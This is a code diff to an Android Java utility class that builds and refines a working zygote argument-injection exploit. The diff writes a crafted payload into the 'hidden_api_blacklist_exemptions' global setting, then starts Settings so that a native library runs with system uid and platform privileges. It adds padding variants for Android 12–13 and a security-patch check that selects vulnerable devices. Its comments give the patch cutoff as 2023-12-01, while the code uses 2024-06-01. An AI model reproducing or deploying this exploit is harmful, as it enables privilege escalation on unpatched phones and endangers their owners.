@@ -3,29 +3,44 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
+import android.os.Build;
 import android.provider.Settings;
+import java.time.LocalDate;
+import java.time.format.DateTimeFormatter;
+import java.time.format.DateTimeParseException;
 
 public class Util {
 	final static String basePoc;//"\n\n\n\n\n11\n--setuid=1000\n--setgid=9997\n--setgroups=3003\n--runtime-args\n--mount-external-full\n--mount-external-legacy\n--seinfo=platform:privapp:targetSdkVersion=30:complete\n--runtime-flags=43267\n--nice-name=zYg0te2\n--invoke-with\n%s; #,,,,X";
-	
+
 	static {
 		String n = "\n";
+		int count = 0;
 		StringBuffer poc = new StringBuffer();
-		poc.append(n.repeat(5) + 11 + n);
-		poc.append("--setuid=1000" + n);
-		poc.append("--setgid=9997" + n);
-		poc.append("--setgroups=3003" + n);
-		poc.append("--runtime-args" + n);
-		poc.append("--mount-external-full" + n);
-		poc.append("--mount-external-legacy" + n);
-		poc.append("--seinfo=platform:privapp:targetSdkVersion=30:complete" + n);
-		poc.append("--runtime-flags=43267" + n);
-		poc.append("--nice-name=zYg0te2" + n);
-		poc.append("--invoke-with" + n);
-		poc.append("%s; #,,,,X");
+		if (Build.VERSION.SDK_INT <= 30) {
+			count = 5;
+			poc.append(n.repeat(count) + 11 + n);
+		} else if (Build.VERSION.SDK_INT <= 33) {
+			count = 5001;
+			poc.append(n.repeat(count) + "A".repeat(3157) + 11);
+		}
+
+
+		poc.append("--setuid=1000" + n)
+			.append("--setgid=9997" + n)
+			.append("--setgroups=3003" + n)
+			.append("--runtime-args" + n)
+			.append("--mount-external-full" + n)
+			.append("--mount-external-legacy" + n)
+			.append("--seinfo=platform:privapp:targetSdkVersion=30:complete" + n)
+			.append("--runtime-flags=43267" + n)
+			.append("--nice-name=zYg0te2" + n)
+			.append("--invoke-with" + n)
+			.append("%s; #")
+			.append(",".repeat(count -1))
+			.append("X");
 		basePoc = poc.toString();
 	}
-	
+
     public static String getNameByUid(int uid) {
 		switch (uid) {
 			case 0: return "root(0)";
@@ -91,10 +106,10 @@ public class Util {
 		if (context == null) {
 			throw new RuntimeException("Context is null!!");
 		}
-		
+
 		StringBuffer sb = new StringBuffer();
 		String packageName = context.getApplicationContext().getPackageName();
-		
+
 		if (context.checkSelfPermission("android.permission.WRITE_SECURE_SETTINGS") != PackageManager.PERMISSION_GRANTED) {
 			sb.append("No android.permission.WRITE_SECURE_SETTINGS permission : (\n");
 			sb.append(String.format("Use pm grant %s android.permission.WRITE_SECURE_SETTINGS to grant it", packageName));
@@ -108,22 +123,22 @@ public class Util {
 		String nativeLibraryDir = applicationInfo.nativeLibraryDir;
 		String epath = nativeLibraryDir + "/libshizuku.so";
 		String pocString = String.format(basePoc, epath);
-		
+
 		sb.append("use poc\n");
 		sb.append(pocString);
-		
+
 		Settings.Global.putString(context.getContentResolver(), "hidden_api_blacklist_exemptions", pocString);
-		
+
 		startSetting(context);
-		
+
 		Thread.sleep(200);
-		
+
 		Settings.Global.putString(context.getContentResolver(), "hidden_api_blacklist_exemptions", "");
-		
-		sb.append("Success");
+
+		sb.append("\nSuccess");
 		return sb;
 	}
-	
+
 	private static void startSetting(Context context) {
 		String packageName = "com.android.settings"; // 替换为目标应用包名
 		PackageManager packageManager = context.getPackageManager();
@@ -133,9 +148,38 @@ public class Util {
 			context.startActivity(intent);
 		}
 	}
-	
+
 	public static void register() {
-		
+
 	}
+
+	public static boolean canUsePoc() {
+		return Build.VERSION.SDK_INT >= 28 && Build.VERSION.SDK_INT <= 33 && !isSecurityPatchUpToDate(); 
+	}
+
+	public static String getSecurityPatchLevel() {
+        return Build.VERSION.SECURITY_PATCH; // 返回类似 "2024-05-01"
+    }
+
+    /**
+     * 判断安全补丁是否过期（以 2023-12-01 为安全底线）
+     * @return true 表示安全，false 表示存在风险
+     */
+    public static boolean isSecurityPatchUpToDate() {
+        String patchStr = getSecurityPatchLevel();
+        if (patchStr == null || patchStr.isEmpty()) {
+            return false; // 无法获取，视为不安全
+        }
+
+        try {
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd");
+            LocalDate patchDate = LocalDate.parse(patchStr, formatter);
+            LocalDate cutoffDate = LocalDate.of(2024, 6, 1); // 安全底线
+
+            return !patchDate.isBefore(cutoffDate); // 补丁 >= 2023-12-01 则安全
+        } catch (DateTimeParseException e) {
+            return false; // 格式错误，视为不安全
+        }
+    }
 }
 
